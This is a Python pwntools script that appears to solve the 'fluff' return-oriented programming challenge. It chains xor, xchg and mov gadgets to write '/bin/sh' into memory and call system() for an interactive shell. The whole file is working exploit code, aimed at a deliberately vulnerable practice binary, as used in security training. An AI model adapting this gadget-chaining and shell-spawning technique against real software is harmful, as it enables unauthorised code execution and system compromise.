#!/usr/bin/env python
from pwn import *

context.log_level = 'debug'
context.terminal = ['lxterminal', '-e']

local = 1
if local:
	p = process('./fluff')
else:
	p = remote()

call_sys = 0x4005E0
useful_func = 0x400807

# 0x0000000000400822 : xor r11, r11 ; pop r14 ; mov edi, 0x601050 ; ret
xor_r11_r11_ = 0x0000000000400822
# 0x000000000040082f : xor r11, r12 ; pop r12 ; mov r13d, 0x604060 ; ret
xor_r11_r12_ = 0x000000000040082f
# 0x000000000040084e : mov qword ptr [r10], r11 ; pop r13 ; pop r12 ; xor byte ptr [r10], r12b ; ret
mov_pr10_r11_ = 0x000000000040084e
# 0x0000000000400840 : xchg r11, r10 ; pop r15 ; mov r11d, 0x602050 ; ret
xchg_r11_r10_ = 0x0000000000400840
# 0x0000000000400832 : pop r12 ; mov r13d, 0x604060 ; ret
pop_r12__ret = 0x0000000000400832

gdb.attach(p)

command = '/bin/sh\x00'
buf = 0x601090

payload = cyclic(0x200)
payload = 'A' * 40

for i in range(len(command) / 8):
	payload += p64(pop_r12__ret) + \
               p64(buf + 8 * i) + \
               p64(xor_r11_r11_) + \
               p64(0xcafebabe) + \
               p64(xor_r11_r12_) + \
               p64(0xcafebabe) + \
               p64(xchg_r11_r10_) + \
               p64(0xcafebabe)
	payload += p64(pop_r12__ret) + \
               command[8 * i:8 * i + 8] + \
               p64(xor_r11_r11_) + \
               p64(0xcafebabe) + \
               p64(xor_r11_r12_) + \
               p64(0xcafebabe) + \
               p64(mov_pr10_r11_) + \
               p64(0xcafebabe) + p64(0)

pop_rdi_ret = 0x00000000004008c3
payload += p64(pop_rdi_ret) + p64(buf) + p64(call_sys)

p.recvuntil('> ')
p.sendline(payload)

p.interactive()
